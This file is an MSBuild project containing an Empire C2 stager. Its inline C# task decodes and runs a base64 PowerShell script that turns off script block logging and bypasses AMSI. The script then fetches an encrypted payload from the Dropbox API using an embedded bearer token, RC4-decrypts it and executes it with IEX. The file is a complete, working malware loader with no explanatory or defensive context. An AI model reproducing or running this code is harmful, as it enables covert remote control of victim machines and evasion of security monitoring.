<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="EmpireStager"><ClassExample /></Target><UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><Task><Reference Include="System.Management.Automation" /><Using Namespace="System" /><Using Namespace="System.IO" /><Using Namespace="System.Reflection" /><Using Namespace="System.Collections.Generic" /><Code Type="Class" Language="cs"><![CDATA[ using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("SQBGACgAJABQAFMAVgBlAHIAUwBJAG8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBlAEYAXQAuAEEAUwBTAEUATQBiAEwAWQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATAB1AEUAKAAkAG4AdQBMAGwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABMAGUAYwB0AGkATwBOAHMALgBHAEUATgBFAFIAaQBDAC4ARABJAGMAdABJAG8AbgBhAFIAWQBbAHMAdAByAEkATgBnACwAUwB5AHMAdABFAE0ALgBPAGIAagBFAEMAVABdAF0AOgA6AE4ARQB3ACgAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AEEATAB9AEUAbABzAEUAewBbAFMAQwByAEkAUABUAEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBBAEwAVQBlACgAJABOAHUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAQwBUACAAQwBPAGwAbABFAEMAdABpAG8AbgBTAC4ARwBlAG4ARQBSAGkAQwAuAEgAQQBzAGgAUwBFAFQAWwBzAFQAUgBJAE4ARwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAcwBzAGUATQBiAEwAWQAuAEcAZQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATABVAGUAKAAkAE4AVQBMAGwALAAkAFQAcgB1AEUAKQB9ADsAfQA7AFsAUwBZAHMAVABFAG0ALgBOAGUAVAAuAFMARQByAHYAaQBDAEUAUABPAGkATgBUAE0AQQBOAEEAZwBlAHIAXQA6ADoARQB4AHAARQBDAHQAMQAwADAAQwBvAE4AdABpAG4AdQBlAD0AMAA7ACQAVwBDAD0ATgBFAFcALQBPAGIASgBFAGMAdAAgAFMAeQBTAHQAZQBNAC4ATgBlAFQALgBXAEUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgAZQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBvAFgAeQA9AFsAUwB5AHMAdABFAE0ALgBOAEUAVAAuAFcAZQBCAFIARQBxAHUAZQBzAFQAXQA6ADoARABFAGYAQQBVAGwAVABXAEUAYgBQAHIATwB4AHkAOwAkAFcAYwAuAFAAcgBPAHgAeQAuAEMAUgBFAGQARQBuAHQASQBhAGwAUwAgAD0AIABbAFMAeQBzAHQARQBNAC4ATgBlAFQALgBDAFIAZQBEAGUAbgBUAEkAYQBsAEMAQQBjAGgAZQBdADoAOgBEAGUARgBBAFUAbABUAE4AZQB0AFcAbwBSAGsAQwByAEUARABFAE4AdABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAdABFAE0ALgBUAGUAWABUAC4ARQBOAGMAbwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQBUAEUAcwAoACcAdgBrAG4AbwA8AEgAYQBGACsAeQBMAFoAWQBLAGoAQgByAEAAewB8AHAAKAAzADgAZQAhAFAAYwBSACoAZgBTACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdAA9ACcAMABTAGQASwAzAGgASwAtAGcAUAA4AEEAQQBBAEEAQQBBAEEAQQBUAHUAXwBJAE8AVQB4AHUAZQByAEMATQBfAEYATgA5AEoANABPAFEARwBCAEsAbwAyADAAcwBoAG8ASABzAEwAdQBjAHYAWQAtAE0ARwBTAEQAUABkAEsASQAnADsAJABXAEMALgBIAGUAQQBEAGUAcgBzAC4AQQBEAEQAKAAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgAsACIAQgBlAGEAcgBlAHIAIAAkAHQAIgApADsAJABXAEMALgBIAEUAYQBkAEUAUgBTAC4AQQBkAEQAKAAiAEQAcgBvAHAAYgBvAHgALQBBAFAASQAtAEEAcgBnACIALAAnAHsAIgBwAGEAdABoACIAOgAiAC8ARQBtAHAAaQByAGUALwBzAHQAYQBnAGkAbgBnAC8AZABlAGIAdQBnAHAAcwAiAH0AJwApADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AdwBOAEwATwBhAGQARABhAFQAQQAoACcAaAB0AHQAcABzADoALwAvAGMAbwBuAHQAZQBuAHQALgBkAHIAbwBwAGIAbwB4AGEAcABpAC4AYwBvAG0ALwAyAC8AZgBpAGwAZQBzAC8AZABvAHcAbgBsAG8AYQBkACcAKQA7ACQAaQB2AD0AJABkAEEAdABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAEEAdABBAFsANAAuAC4AJABkAGEAVABhAC4ATABFAG4AZwB0AGgAXQA7AC0AagBvAEkAbgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}} ]]></Code></Task></UsingTask></Project>
